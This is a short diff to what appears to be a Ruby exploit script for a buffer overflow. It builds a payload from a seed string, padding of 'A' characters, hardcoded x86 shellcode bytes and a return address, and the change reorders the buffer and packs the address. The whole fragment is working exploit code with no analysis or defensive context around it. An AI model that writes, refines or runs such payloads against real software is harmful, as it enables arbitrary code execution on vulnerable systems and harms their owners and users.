@@ -6,8 +6,8 @@ shellcode = "\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC" +
   "\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3"
 seed = "AAA\n"
 padding = "A" * (1932 - shellcode.length)
-address = "\x00\x40\x99\xf8"
+address = 0x004099f8 + (1932 - shellcode.length)
 
-pozload = seed + shellcode + padding + address
+pozload = seed + padding + shellcode + [address].pack('N')
 
 puts pozload
